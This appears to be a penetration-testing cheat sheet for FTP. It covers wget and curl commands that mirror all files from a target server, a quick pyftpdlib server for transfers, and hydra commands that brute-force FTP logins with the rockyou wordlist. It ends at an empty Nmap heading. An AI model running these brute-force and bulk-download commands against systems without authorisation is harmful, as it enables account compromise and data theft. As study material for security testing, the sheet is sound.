### **Introduction**

FTP (File Transfer Protocol) is a network protocol used to transfer files between a client and a server over a TCP network. It supports file uploads, downloads, and directory management, using separate control and data channels for commands and file data. FTP can allow anonymous or authenticated access with a username and password.

### **Downloading Files**

Overview of commands for downloading files from an FTP server using various tools.

| Command | Description |
| --- | --- |
| `wget -r ftp://[USERNAME]:@[TARGET-IP]` | downloads all files from the FTP server, useful for complete directory downloads. |
| `wget -m --no-passive ftp://[USERNAME]:[PASSWORD]@[TARGET-IP]` | Mirrors the entire FTP site, downloading all available files and directories, preserving the server structure. |
| `ftp [TARGET-IP]` then `binary` and `get [FILE-NAME]` | Connects to an FTP server, switches to binary mode for data integrity, and downloads a specified file. |
| `curl -O ftp://[USERNAME]:[PASSWORD]@[TARGET-IP]/PATH/TO/FILE_OR_DIR` | Downloads a specific file or directory from the FTP server, using curl for precise retrieval. |

### **Transferring Files**

Commands for setting up an FTP server and uploading files.

| Command | Description |
| --- | --- |
| `python3 -m pyftpdlib -p 21` | Starts an FTP server on port 21 using Python pyftpdlib, convenient for quick setups on local networks. |
| `ftp [TARGET-IP]` then `binary` and `put [FILE-TO-UPLOAD]` | Connects to an FTP server and uploads a file after switching to binary mode to preserve file integrity. |

| Unknown Password | `hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ftp` |
| Unknown User and Password | `hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] ftp` |
| Different Port | `hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ftp -s 9999` |

### **Nmap Nse Scripts**
